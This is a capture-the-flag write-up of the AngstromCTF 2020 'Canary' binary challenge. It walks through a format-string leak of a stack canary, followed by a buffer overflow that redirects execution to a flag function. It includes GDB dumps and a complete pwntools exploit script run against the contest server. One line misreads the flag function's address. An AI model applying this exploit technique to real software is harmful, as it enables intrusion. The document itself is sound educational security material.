---
layout: post
title: AngstromCTF 2020 - Canary
excerpt: "Writeup for buffer overflow challenge with canary from AngstromCTF 2020"
categories: [AngstromCTF 2020, pwn]
---

Canary was the second challenge in the Binary category from AngstromCTF 2020, and was very similar to the first challenge which was called [no canary]({ post_url 2020-03-22-angstromctf-no-canary }). The challenge provided an executable and some source code (below).

{% highlight c %}
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

void flag() {
	system("/bin/cat flag.txt");
}

void wake() {
	puts("Cock-a-doodle-doo! Cock-a-doodle-doo!\n");
	puts("        .-\"-.");
	puts("       / 4 4 \\");
	puts("       \\_ v _/");
	puts("       //   \\\\");
	puts("      ((     ))");
	puts("=======\"\"===\"\"=======");
	puts("         |||");
	puts("         '|'\n");
	puts("Ahhhh, what a beautiful morning on the farm!");
	puts("And my canary woke me up at 5 AM on the dot!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
}

void greet() {
	printf("Hi! What's your name? ");
	char name[20];
	gets(name);
	printf("Nice to meet you, ");
	printf(strcat(name, "!\n"));
	printf("Anything else you want to tell me? ");
	char info[50];
	gets(info);
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	wake();
	greet();
}
{% endhighlight %}

Like the previous challenge, there is a flag function, and calls to the vulnerable gets function. Running checksec on the binary though reveals an extra hurdle that we will need to surmount - a stack canary. 

```
root@9903d51849b1 /pwn# checksec ./canary
[*] '/pwn/canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

If you're not familiar with a stack canary, it is just a basic buffer overflow mitigation. At the beginning of the function, a randomized address called the stack cookie will be placed onto the stack before the return pointer, and will be checked at the end of the function. If the value of the stack cookie changed since the beginning of the function than the return instruction will never be called, and overwriting the return pointer is useless. You can read some more about stack canaries [here](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries).

Since the vulnerable gets calls are in the greet function, we will start out analysis there. Launching the executable in [GDB](https://www.gnu.org/software/gdb/) we can see the gets calls and the comparison with the stack cookie. 

```
(gdb) disas greet
Dump of assembler code for function greet:
   0x0000000000400891 <+0>:	push   rbp
   0x0000000000400892 <+1>:	mov    rbp,rsp
   0x0000000000400895 <+4>:	sub    rsp,0x60
   0x0000000000400899 <+8>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004008a2 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004008a6 <+21>:	xor    eax,eax
   0x00000000004008a8 <+23>:	lea    rdi,[rip+0x382]        # 0x400c31
   0x00000000004008af <+30>:	mov    eax,0x0
   0x00000000004008b4 <+35>:	call   0x400660 <printf@plt>
   0x00000000004008b9 <+40>:	lea    rax,[rbp-0x60]
   0x00000000004008bd <+44>:	mov    rdi,rax
   0x00000000004008c0 <+47>:	mov    eax,0x0
   0x00000000004008c5 <+52>:	call   0x400670 <gets@plt>
   0x00000000004008ca <+57>:	lea    rdi,[rip+0x377]        # 0x400c48
   0x00000000004008d1 <+64>:	mov    eax,0x0
   0x00000000004008d6 <+69>:	call   0x400660 <printf@plt>
   0x00000000004008db <+74>:	lea    rax,[rbp-0x60]
   0x00000000004008df <+78>:	mov    rcx,0xffffffffffffffff
   0x00000000004008e6 <+85>:	mov    rdx,rax
   0x00000000004008e9 <+88>:	mov    eax,0x0
   0x00000000004008ee <+93>:	mov    rdi,rdx
   0x00000000004008f1 <+96>:	repnz scas al,BYTE PTR es:[rdi]
   0x00000000004008f3 <+98>:	mov    rax,rcx
   0x00000000004008f6 <+101>:	not    rax
   0x00000000004008f9 <+104>:	lea    rdx,[rax-0x1]
   0x00000000004008fd <+108>:	lea    rax,[rbp-0x60]
   0x0000000000400901 <+112>:	add    rax,rdx
   0x0000000000400904 <+115>:	mov    WORD PTR [rax],0xa21
   0x0000000000400909 <+120>:	mov    BYTE PTR [rax+0x2],0x0
   0x000000000040090d <+124>:	lea    rax,[rbp-0x60]
   0x0000000000400911 <+128>:	mov    rdi,rax
   0x0000000000400914 <+131>:	mov    eax,0x0
   0x0000000000400919 <+136>:	call   0x400660 <printf@plt>
   0x000000000040091e <+141>:	lea    rdi,[rip+0x33b]        # 0x400c60
   0x0000000000400925 <+148>:	mov    eax,0x0
   0x000000000040092a <+153>:	call   0x400660 <printf@plt>
   0x000000000040092f <+158>:	lea    rax,[rbp-0x40]
   0x0000000000400933 <+162>:	mov    rdi,rax
   0x0000000000400936 <+165>:	mov    eax,0x0
   0x000000000040093b <+170>:	call   0x400670 <gets@plt>
   0x0000000000400940 <+175>:	nop
   0x0000000000400941 <+176>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400945 <+180>:	xor    rax,QWORD PTR fs:0x28
   0x000000000040094e <+189>:	je     0x400955 <greet+196>
   0x0000000000400950 <+191>:	call   0x400630 <__stack_chk_fail@plt>
   0x0000000000400955 <+196>:	leave  
   0x0000000000400956 <+197>:	ret    
End of assembler dump.
(gdb) 
```

At the begining of the function, at instruction `greet+8` you can see an address being moved into the register rax. At the end of the function - at instruction `greet+189` - you can see that the rax register is being compared to the same address from the begining of the function! If the two are equal - and have not been overwritten by an overflow or something else - the ret instruction is called. Otherwise, `__stack_chk_fail` is called and the function never returns. 

This is confirmed by purposfully overwriting the stack cookie with lots of As (seen below). The string "\*** stack smashing detected ***: ./canary terminated" indicates that `__stack_chk_fail` was called.

```
root@9903d51849b1 /pwn# python -c 'print "A" * 100' | ./canary 
Cock-a-doodle-doo! Cock-a-doodle-doo!

        .-"-.
       / 4 4 \
       \_ v _/
       //   \\
      ((     ))
=======""===""=======
         |||
         '|'

Ahhhh, what a beautiful morning on the farm!
And my canary woke me up at 5 AM on the dot!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Hi! What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Anything else you want to tell me? *** stack smashing detected ***: ./canary terminated
fish: Process 367, './canary' 'python -c 'print "A" * 100' |...' terminated by signal SIGABRT (Abort)
root@9903d51849b1 /pwn#
```

So how might we pass this check while still overwriting the return pointer? Bruteforcing could be an option, but since this is a 64-bit binary the stack cookie is a 64 bit address, which would not be very easy to bruteforce. Reexaminating the code though we can see that our input to gets is passed right into the first parameter of printf! This creates a [format string vulnerability](https://en.wikipedia.org/wiki/Uncontrolled_format_string) which allows us to leak values off of the stack. Since our string is passed to the first parameter to printf, we can include things like `%x`. This will cause values on the stack to be interpreted as other parameters of printf, and they will be printed out for us. Since the stack cookie is just a pointer on the stack, we can leak it with the first call to gets and printf, and can do our normal buffer overflow on the second call to gets (making sure to keep the leaked stack cookie in tact).

Now that we know what we have a plan, let's hop into GDB to get started! With a little bit of poking around we can find that the stack cookie is stored at the address `0x7fffffffe648`, or `$rbp-0x8` (it is moved here in instruction `greet+17`). 

```
(gdb) b *0x00000000004008a6
Breakpoint 1 at 0x4008a6
(gdb) r
(gdb) r
Starting program: /pwn/canary 
Cock-a-doodle-doo! Cock-a-doodle-doo!

        .-"-.
       / 4 4 \
       \_ v _/
       //   \\
      ((     ))
=======""===""=======
         |||
         '|'

Ahhhh, what a beautiful morning on the farm!
And my canary woke me up at 5 AM on the dot!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^


Breakpoint 1, 0x00000000004008a6 in greet ()
(gdb) x/xg $rbp-0x8
0x7fffffffe648:	0x72136546f7884d00
(gdb) x/20xg $rsp
0x7fffffffe5f0:	0x000000000000000a	0x0000000000400c17
0x7fffffffe600:	0x00007fffffffe750	0x00007ffff7a8781b
0x7fffffffe610:	0x0000000000000019	0x00007ffff7dd2620
0x7fffffffe620:	0x0000000000400c17	0x00007ffff7a7c7fa
0x7fffffffe630:	0x0000000000000000	0x00007fffffffe650
0x7fffffffe640:	0x00000000004006a0	0x72136546f7884d00
0x7fffffffe650:	0x00007fffffffe670	0x00000000004009c9
0x7fffffffe660:	0x00007fffffffe750	0x0000000000000000
0x7fffffffe670:	0x00000000004009d0	0x00007ffff7a2d830
0x7fffffffe680:	0x0000000000000001	0x00007fffffffe758
```

Next, we can set a breakpoint after the format string vulnerable printf, and leak some pointers off the stack to get an idea of where the stack cookie lies. 

```
(gdb) b *0x0000000000400933
Breakpoint 1 at 0x400933
(gdb) r
Starting program: /pwn/canary 
Cock-a-doodle-doo! Cock-a-doodle-doo!

        .-"-.
       / 4 4 \
       \_ v _/
       //   \\
      ((     ))
=======""===""=======
         |||
         '|'

Ahhhh, what a beautiful morning on the farm!
And my canary woke me up at 5 AM on the dot!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Hi! What's your name? %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
Nice to meet you, 0x7fffffffbf60 0x69 0xffffffffffffff95 0x7ffff7fec700 0x12 0x7025207025207025 0x2520702520702520 
0xa2120 0x7025207025207025 0x2520702520702520 0x7025207025207025 0x7025207025207025 0x2520702520702520 
0x4009d0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa2120 
0x7fffffffe750 (nil) 0x4009d0 0x7ffff7a2d830 0x1 0x7fffffffe758 0x1f7ffcca0 0x400957 (nil) 0xae2858ef526f2176 
0x4006a0 0x7fffffffe750 (nil) (nil) 0x51d7a7908ccf2176 0x51d7b72aee1f2176 !
Anything else you want to tell me? 

Breakpoint 1, 0x0000000000400933 in greet ()

(gdb) x/xg $rbp-0x8
0x7fffffffe648:	0x2070252070252070
(gdb) 
```

Now that we know that the stack cookie lies in the 17th position we can leak it more efficiently with something like `;%17$p;`. The 17 will reference what printf thinks to be the 17th parameter (but we know it is just the stack cookie). Keep in mind that the semi colons here are just arbitrary characters that will make it easier to grab the stack cookie in out exploit. Finally, we can use GDB to find the amount of characters we need to write to hit the return pointer.

```
(gdb) b *0x0000000000400940
Breakpoint 1 at 0x400940
(gdb) b *0x0000000000400956
Breakpoint 2 at 0x400956

(gdb) r
Starting program: /pwn/canary 
Cock-a-doodle-doo! Cock-a-doodle-doo!

        .-"-.
       / 4 4 \
       \_ v _/
       //   \\
      ((     ))
=======""===""=======
         |||
         '|'

Ahhhh, what a beautiful morning on the farm!
And my canary woke me up at 5 AM on the dot!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Hi! What's your name? ;%17$p;
Nice to meet you, ;0x845f7fced767200;!
Anything else you want to tell me? AAAABBBBAAAABBBBAAAABBBB

Breakpoint 1, 0x0000000000400940 in greet ()

(gdb) x/20xg $rsp
0x7fffffffe5f0:	0x213b70243731253b	0x000000000040000a
0x7fffffffe600:	0x00007fffffffe750	0x00007ffff7a8781b
0x7fffffffe610:	0x4242424241414141	0x4242424241414141
0x7fffffffe620:	0x4242424241414141	0x00007ffff7a7c700
0x7fffffffe630:	0x0000000000000000	0x00007fffffffe650
0x7fffffffe640:	0x00000000004006a0	0x0845f7fced767200
0x7fffffffe650:	0x00007fffffffe670	0x00000000004009c9
0x7fffffffe660:	0x00007fffffffe750	0x0000000000000000
0x7fffffffe670:	0x00000000004009d0	0x00007ffff7a2d830
0x7fffffffe680:	0x0000000000000001	0x00007fffffffe758

(gdb) c
Continuing.

Breakpoint 2, 0x0000000000400956 in greet ()
(gdb) i r rsp
rsp            0x7fffffffe658	0x7fffffffe658
(gdb) x flag
0x400787 <flag>:	0xe5894855
(gdb)
```

Above you can see clearly that we start to write at address `0x7fffffffe610`, and the return pointer is at `0x7fffffffe658`. Also, the flag function is at `0xe5894855`. As usual, I use python to do the subtraction and find the offset. I also find the number of characters we need to write before inserting the stack cookie.

```
Python 2.7.12 (default, Oct  8 2019, 14:14:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffe658 - 0x7fffffffe610
72 # bytes before return pointer
>>> 0x7fffffffe648 - 0x7fffffffe610
56 # bytes before stack cookie
```

Now that we have all necessary information we can start to write an exploit. As you can see below, I used the [pwntools](https://github.com/Gallopsled/pwntools) library which made exploitation very easy.

{% highlight python %}
#!/usr/bin/env python

from pwn import *

r = remote('shell.actf.co', 20701)

# flag function address
flag = p64(0x400787)

# format string to leak stack cookie
r.sendline(';%17$p;')

# the stack cookie
cookie = int(r.recvuntil('tell me? ').split(';')[1], 16)

# full buffer overflow payload
payload = 'A' * 56 + p64(cookie) + 'A' * (72 - 56 - 8) + flag

# send the payload
r.sendline(payload)

# print the results
print(r.recvall())
{% endhighlight %}

Running the script gives the following.

```
root@9903d51849b1 /pwn# python exploit.py 
[+] Opening connection to shell.actf.co on port 20701: Done
[+] Receiving all data: Done (51B)
[*] Closed connection to shell.actf.co port 20701
actf{youre_a_canary_killer_>:(}
Segmentation fault
```

As you can see, the flag is `actf{youre_a_canary_killer_>:(}`!